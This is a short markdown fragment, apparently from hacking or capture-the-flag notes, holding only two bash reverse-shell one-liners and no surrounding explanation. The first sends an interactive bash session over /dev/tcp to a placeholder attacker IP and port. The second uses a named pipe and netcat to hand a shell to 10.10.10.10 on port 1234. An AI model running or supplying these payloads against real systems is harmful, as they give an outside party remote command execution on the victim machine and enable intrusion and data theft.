
---
```bash
bash -c 'bash -i >& /dev/tcp/[AttackBoxIPi/[Port] 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```